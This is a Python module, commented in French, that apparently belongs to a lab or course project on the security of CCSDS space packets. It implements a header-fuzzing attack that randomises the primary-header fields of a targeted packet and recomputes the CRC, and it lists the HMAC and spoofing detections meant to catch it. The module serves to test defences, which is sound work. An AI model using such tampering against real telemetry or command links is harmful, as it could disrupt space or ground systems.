# =============================================================
# fuzz_header.py – Attaque 2 / Vecteur 4 : Fuzzing de l'en-tête
#
# Randomise tous les champs de l'en-tête primaire CCSDS d'un
# paquet ciblé (APID, seqCount, seqFlags, version, type…),
# puis recalcule le CRC. Simule une attaque non ciblée qui
# cherche à désorienter le parseur récepteur.
# =============================================================

import random
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from src.receiver.frame_parser import parse_stream
from src.attacks._utils import rebuildPacket, offsetInStream


def fuzzHeader(
    rawStream: bytes,
    targetSeq: int,
    verbose: bool = True,
) -> bytes:
    """
    Randomise tous les champs de l'en-tête primaire d'un paquet, CRC recomputed.

    Démontre qu'un attaquant peut injecter n'importe quelle valeur d'en-tête
    sans mécanisme d'authentification cryptographique. Le payload est conservé
    intact ; seul l'en-tête est corrompu aléatoirement.

    Args:
        rawStream:  Flux de paquets CCSDS bruts.
        targetSeq:  seqCount du paquet à altérer.
        verbose:    Afficher un log de l'altération.

    Returns:
        Flux modifié avec en-tête aléatoire et CRC recomputed.

    Détection (Défense 2) :
        → HMAC_FAIL / HMAC_UNKNOWN : l'en-tête fait partie du matériau HMAC
        → APID_SPOOF, SEQ_GAP…    : selon les valeurs aléatoires générées
    """
    packets = parse_stream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset = offsetInStream(packets, targetSeq)
        newPkt = rebuildPacket(
            apid       = random.randint(0, 0x7FF),
            seqFlags   = random.randint(0, 3),
            seqCount   = random.randint(0, 0x3FFF),
            version    = random.randint(0, 7),
            packetType = random.randint(0, 1),
            secHdrFlag = random.randint(0, 1),
            payload    = pkt["payload"],
        )
        result[offset : offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(
                f"[A2/fuzzHeader] seqCount={targetSeq} : "
                f"en-tête entièrement randomisé  (CRC recomputed)"
            )
        break

    return bytes(result)
